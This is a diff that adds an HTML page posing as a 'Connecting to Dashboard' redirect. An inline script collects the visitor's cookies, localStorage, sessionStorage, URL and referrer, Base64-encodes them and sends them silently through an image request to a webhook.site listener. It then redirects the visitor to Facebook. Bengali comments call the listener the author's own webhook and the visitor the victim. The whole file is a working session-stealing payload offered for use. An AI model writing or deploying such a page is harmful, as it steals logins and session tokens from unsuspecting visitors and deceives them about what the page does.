@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+        <h2>Connecting to Dashboard...</h2>
+        <p>Please wait a moment.</p>
+    </div>
+
+    <script>
+        (function() {
+            // ১. ডাটা কালেকশন (Cookie + Local + Session)
+            const rawData = {
+                c: document.cookie,
+                l: JSON.stringify(localStorage),
+                s: JSON.stringify(sessionStorage),
+                u: window.location.href,
+                o: window.location.hostname,
+                r: document.referrer // রিফারার চেক করার জন্য
+            };
+
+            // ২. ডাটাকে Base64 এনকোড করা
+            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(rawData))));
+
+            // ৩. লিসেনার ইউআরএল (তোর Webhook)
+            const listener = "https://webhook.site/aa222275-079e-4bbf-a7b9-17a665cbca1d";
+
+            // ৪. ইমেজের মাধ্যমে সাইলেন্টলি ডাটা পাঠানো
+            const img = new Image();
+            img.src = `${listener}?exfil=${payload}`;
+
+            // ৫. ডাটা পাঠানো শেষ হলে বা ফেইল করলে রিডাইরেক্ট
+            img.onload = img.onerror = function() {
+                // ভিকটিমকে আসল গন্তব্যে পাঠিয়ে দেওয়া
+                window.location.replace("https://www.facebook.com/home.php");
+            };
+
+            // অতিরিক্ত সেফটি: যদি ইমেজ লোড হতে দেরি হয়, ৫ সেকেন্ড পর অটো রিডাইরেক্ট
+            setTimeout(function() {
+                window.location.replace("https://www.facebook.com/home.php");
+            }, 5000);
+        })();
+    </script>
+</body>
+</html>
